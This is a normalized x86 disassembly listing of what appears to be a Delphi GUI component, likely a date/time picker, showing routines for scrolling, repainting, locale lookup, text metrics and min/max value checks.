mov edx [ esi + 0x8 ]
mov [ edx + 0x10 ] eax
xor eax eax
mov [ esi + 0xc ] eax
jmp r-xdata
sub_43c1d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43c1f8
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4550b4
mov edx esi
call sub_42ad20
sub_43c20c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov al [ ebx + 0x244 ]
xor al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
pop ebx
retn
sub_43c244
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_43b574
test eax eax
jne r-xdata
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_4501f4
cmp [ ebx + 0x230 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_43c288
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x23c ]
call sub_419a38
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x23c ]
mov edx esi
call sub_436f90
cmp ebp [ eax + 0x28 ]
je r-xdata
sub_43c2c4
push ebx
push esi
add esp 0xffffffe0
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x8 ]
call sub_4176d0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_4561b4
add esp 0x20
pop esi
pop ebx
retn
mov eax ebx
call sub_43b398
test eax eax
je r-xdata
mov eax ebx
call sub_43b398
lea ecx [ esp + 0x10 ]
mov dl 0x3
call sub_437b54
lea eax [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
call sub_406308
lea edx [ esp + 0x8 ]
mov ecx esp
mov eax ebx
call sub_44e3cc
mov eax esp
call sub_406e64
mov [ esi + 0x8 ] eax
sub_43c33c
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x22c ]
call sub_437cc0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x22c ]
mov edx esi
call sub_437cf0
xor ecx ecx
mov edx 0x3
call sub_43784c
inc esi
dec ebx
jne r-xdata
sub_43c378
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov esi eax
mov eax [ esi + 0x22c ]
call sub_437cc0
mov edi eax
dec edi
test edi edi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ esi + 0x22c ]
call sub_437cf0
mov eax [ eax + 0xc ]
push eax
mov edx ebx
mov eax [ esi + 0x22c ]
call sub_437cf0
mov edx [ eax + 0x24 ]
mov eax [ esp + 0x4 ]
pop ecx
mov ebp [ eax ]
call [ ebp + 0xd4 ]
mov edx ebx
mov eax [ esi + 0x22c ]
call sub_437cf0
mov edx 0x3
call sub_4377e4
test al al
je r-xdata
sub_43c3ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437dd4
xor eax eax
push ebp
push sub_43c485
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437cc0
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c48c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437fb0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov edx ebx
call sub_437cf0
mov edx 0x3
call sub_4377e4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov edx ebx
call sub_437cf0
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403518
sub_43c4a0
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x22c ]
call sub_437cc0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x22c ]
mov edx esi
call sub_437cf0
mov cl 0x1
mov edx 0x3
call sub_43784c
inc esi
dec ebx
jne r-xdata
sub_43c4dc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437dd4
xor eax eax
push ebp
push sub_43c529
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437db4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c530
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437fb0
retn
sub_43c53c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_455b84
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0xa4 ]
mov eax edi
call sub_43b258
cmp [ edi + 0x21c ] 0x0
jne r-xdata
mov edx [ esi + 0xc8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
test bl bl
je r-xdata
sub_43c5a0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
call sub_43f31c
call sub_43f3fc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_453458
push 0x1
mov eax ebx
call sub_4550b4
push eax
call GetScrollPos
mov edi eax
mov edx esi
mov eax ebx
call sub_453458
push 0x1
mov eax ebx
call sub_4550b4
push eax
call GetScrollPos
cmp eax edi
je r-xdata
pop edi
pop esi
pop ebx
retn
push 0xffffffff
push 0x0
mov eax ebx
call sub_4550b4
push eax
call InvalidateRect
jmp r-xdata
sub_43c604
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0xff000005
mov [ eax + 0xc ] 0xff000008
mov [ eax + 0x10 ] 0xff000002
mov [ eax + 0x14 ] 0xffffff
mov [ eax + 0x18 ] 0xffffff
mov [ eax + 0x1c ] 0xff000013
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403668
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_43c654
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_43c745
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_40326c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40437c
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_40326c
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be84
call sub_403ad0
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
mov [ esi + 0x8 ] edx
mov edx [ eax + 0xc ]
mov [ esi + 0xc ] edx
mov edx [ eax + 0x10 ]
mov [ esi + 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ esi + 0x14 ] edx
mov edx [ eax + 0x18 ]
mov [ esi + 0x18 ] edx
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c74c
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_43c760
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
cmp eax 0x5
ja r-xdata
mov eax [ ebx + 0x4 ]
call sub_4553b8
test al al
je r-xdata
jmp [ eax * 4 + jump_table_43c777 ]
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_424640
mov ecx eax
mov edx [ esi * 4 + rw-data ]
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xd8 ]
mov [ ebx + 0x8 ] edi
jmp r-xdata
mov [ ebx + 0xc ] edi
jmp r-xdata
mov [ ebx + 0x10 ] edi
jmp r-xdata
mov [ ebx + 0x14 ] edi
jmp r-xdata
mov [ ebx + 0x18 ] edi
jmp r-xdata
mov [ ebx + 0x1c ] edi
sub_43c7d8
push ebx
mov ebx eax
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
call sub_43c760
mov ecx [ ebx + 0xc ]
mov edx 0x1
mov eax ebx
call sub_43c760
mov ecx [ ebx + 0x10 ]
mov edx 0x2
mov eax ebx
call sub_43c760
mov ecx [ ebx + 0x14 ]
mov edx 0x3
mov eax ebx
call sub_43c760
mov ecx [ ebx + 0x18 ]
mov edx 0x4
mov eax ebx
call sub_43c760
mov ecx [ ebx + 0x1c ]
mov edx 0x5
mov eax ebx
call sub_43c760
pop ebx
retn
sub_43c834
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax 0x100
call sub_4368f8
mov ecx esi
xor edx edx
mov eax edi
call sub_450de0
mov [ edi + 0x245 ] 0x1
mov [ edi + 0x246 ] 0x1
mov eax [ r-xdata ]
mov [ edi + 0x50 ] eax
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43c604
mov [ edi + 0x208 ] eax
call sub_409f64
fstp [ edi + 0x210 ]
fwait
mov [ edi + 0x220 ] 0x7
mov [ edi + 0x230 ] 0x1f
mov [ edi + 0x240 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_43c8d0
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_450f04
mov eax [ esi + 0x208 ]
call sub_40331c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_43c904
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43ca05
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x228 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ca0c
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_40413c
retn
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x238 ]
fnstsw ax
sahf
jae r-xdata
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
lea eax [ ebp - 0xc ]
call sub_40ac24
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40bdc8
call sub_403ad0
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
lea eax [ ebp - 0x14 ]
call sub_40ac24
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40bdc8
call sub_403ad0
sub_43ca18
push ebx
mov ebx eax
mov eax ebx
call sub_45206c
mov eax [ ebx + 0x208 ]
call sub_43c7d8
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
mov eax ebx
call sub_43cff4
mov edx [ ebx + 0x230 ]
mov eax ebx
call sub_43ce7c
mov edx [ ebx + 0x240 ]
mov eax ebx
call sub_43cfb8
mov dl [ ebx + 0x220 ]
mov eax ebx
call sub_43cd28
cmp [ ebx + 0x244 ] 0x0
je r-xdata
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
mov eax ebx
call sub_43cc18
pop ebx
retn
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
push [ ebx + 0x21c ]
push [ ebx + 0x218 ]
mov eax ebx
call sub_43d144
pop ebx
retn
sub_43cab4
xor edx edx
mov dl [ eax + 0x245 ]
mov edx [ edx * 4 + rw-data ]
or edx 0x1
xor ecx ecx
mov cl [ eax + 0x246 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ eax + 0x247 ]
or edx [ ecx * 4 + rw-data ]
movzx eax [ eax + 0x244 ]
or edx [ eax * 4 + rw-data ]
mov eax edx
retn
sub_43cb60
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push [ eax + 0x214 ]
push [ eax + 0x210 ]
lea eax [ ebp + 0x8 ]
call sub_409fb4
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
xor eax eax
push ebp
push sub_43cbe5
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0x8 ]
call sub_402ac8
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] edx
fild [ ebp - 0xc ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xcc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43cc18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43cc18
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_409e8c
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov eax ebx
call sub_4553b8
test al al
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebx + 0x21c ]
push [ ebx + 0x218 ]
mov eax ebx
call sub_43d144
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x210 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x214 ] eax
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
sub_43cca0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx eax
fld [ ebp + 0x8 ]
call sub_402ac8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
fild [ ebp - 0x10 ]
fstp [ ebp - 0x8 ]
fwait
fld [ ebx + 0x218 ]
call sub_402ac8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
fild [ ebp - 0x10 ]
fcomp [ ebp - 0x8 ]
fnstsw ax
sahf
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
fld [ ebp - 0x8 ]
fadd [ r-xdata ]
fstp [ ebp + 0x8 ]
fwait
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
mov eax ebx
call sub_43cb30
add esp 0xfffffff8
fstp [ esp ]
fwait
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax ebx
call sub_43d144
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
sub_43cd28
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_4553b8
test al al
je r-xdata
mov [ esi + 0x220 ] bl
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x7
jne r-xdata
mov edi ebx
and edi 0x7f
push 0x2
lea eax [ esp + 0x4 ]
push eax
push 0x100c
push 0x400
call GetLocaleInfoA
movzx edi [ esp ]
sub edi 0x30
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx edi
call sub_42ad70
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
test eax eax
je r-xdata
sub_43cd90
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43ce68
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x228 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x238 ]
fnstsw ax
sahf
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ce6f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40413c
retn
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_43cff4
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x228 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x22c ] eax
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
lea eax [ ebp - 0xc ]
call sub_40ac24
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40bdc8
call sub_403ad0
sub_43ce7c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov [ ebx + 0x230 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_4553b8
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx esi
call sub_42ad40
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
sub_43cecc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43cfa4
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x238 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x228 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cfab
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40413c
retn
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
mov eax ebx
call sub_43cff4
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x238 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x23c ] eax
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
lea eax [ ebp - 0xc ]
call sub_40ac24
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40bdc8
call sub_403ad0
sub_43cfb8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4553b8
test al al
je r-xdata
mov [ ebx + 0x240 ] esi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx esi
call sub_42ad80
sub_43cff4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
mov ebx eax
xor esi esi
fld [ ebp + 0x10 ]
call sub_402ac8
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
fld [ ebp + 0x8 ]
call sub_402ac8
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fld [ ebx + 0x210 ]
call sub_402ac8
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
fld [ ebx + 0x218 ]
call sub_402ac8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
je r-xdata
cmp [ ebp - 0x18 ] 0x0
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x14 ]
jne r-xdata
je r-xdata
cmp [ ebp - 0x20 ] 0x0
jge r-xdata
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax ebx
call sub_4553b8
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x14 ]
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_43cb60
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
lea ecx [ ebp - 0x40 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xe0 ]
test al al
jne r-xdata
jle r-xdata
cmp eax [ ebp - 0x20 ]
jbe r-xdata
jge r-xdata
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x1c ]
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_43cb60
jmp r-xdata
or esi 0x1
fild [ ebp - 0x18 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x40 ]
call sub_409e8c
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_43cca0
jmp r-xdata
jle r-xdata
cmp eax [ ebp - 0x20 ]
jbe r-xdata
or esi 0x2
fild [ ebp - 0x20 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x30 ]
call sub_409e8c
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_43cca0
jmp r-xdata
sub_43d144
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov ebx eax
cmp [ ebx + 0x244 ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x20 ]
call sub_409e8c
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_409e8c
mov eax ebx
call sub_4553b8
test al al
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_43cc18
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x210 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x214 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x218 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x21c ] eax
mov eax ebx
call sub_4550b4
lea edx [ ebp - 0x20 ]
call sub_42ad58
test eax eax
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
sub_43d1f4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ r-xdata ]
mov [ esi + 0x20c ] eax
mov [ esi + 0x251 ] 0x0
xor edx edx
mov eax esi
call sub_43c834
push [ esi + 0x214 ]
push [ esi + 0x210 ]
lea eax [ esi + 0x258 ]
call sub_409e8c
mov [ esi + 0x269 ] 0x0
mov [ esi + 0x252 ] 0x1
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xff000005
mov eax esi
call sub_44ea54
xor edx edx
mov eax esi
call sub_44ea78
mov dl 0x1
mov eax esi
call sub_4552e8
mov edx 0xba
mov eax esi
call sub_44e070
mov eax esi
call sub_43d2c4
mov [ esi + 0x250 ] 0x0
mov [ esi + 0x253 ] 0x0
mov [ esi + 0x254 ] 0x0
mov [ esi + 0x256 ] 0x0
mov [ esi + 0x268 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_43d2c4
push ebp
mov ebp esp
add esp 0xffffff88
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43d33a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call GetTextMetricsA
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_424b14
push eax
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
mov ebx eax
lea eax [ ebp - 0x78 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call GetTextMetricsA
push ebx
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d341
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_43d390
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
mov edx edi
mov eax ebp
call sub_451f40
mov ecx r-xdata
mov edx edi
mov eax ebp
call sub_451e6c
cmp [ ebp + 0x254 ] 0x1
jne r-xdata
cmp [ ebp + 0x256 ] 0x1
jne r-xdata
or [ edi + 0x4 ] 0x1
xor eax eax
mov al [ ebp + 0x253 ]
mov eax [ eax * 4 + rw-data ]
or [ edi + 0x4 ] eax
or [ edi + 0x4 ] 0x9
jmp r-xdata
cmp bl 0x1
jne r-xdata
test bl bl
jne r-xdata
mov bl [ ebp + 0x250 ]
mov eax ebp
mov si 0xffc8
call sub_403518
test al al
je r-xdata
cmp [ ebp + 0x268 ] 0x0
je r-xdata
or [ edi + 0x4 ] 0x20
xor ebx ebx
mov bl 0x1
jmp r-xdata
cmp [ ebp + 0x269 ] 0x0
je r-xdata
or [ edi + 0x4 ] 0x10
and [ edi + 0x24 ] 0xfffffffc
pop ebp
pop edi
pop esi
pop ebx
retn
or [ edi + 0x4 ] 0x2
sub_43d45c
push ebx
mov ebx eax
mov eax ebx
call sub_43ca18
mov dl [ ebx + 0x252 ]
mov eax ebx
call sub_43d878
mov eax [ ebx + 0x290 ]
call sub_4043d8
test eax eax
jle r-xdata
pop ebx
retn
mov eax [ ebx + 0x290 ]
call sub_4045d8
push eax
push 0x0
push 0x1005
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
sub_43d4c4
push ebx
mov ebx eax
mov eax ebx
call sub_454610
mov eax ebx
call sub_43d2c4
push 0xffffffff
push 0x0
mov eax ebx
call sub_4550b4
push eax
call InvalidateRect
pop ebx
retn
sub_43d4e8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] ecx
mov esi eax
xor eax eax
push ebp
push sub_43d6fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edx + 0x8 ]
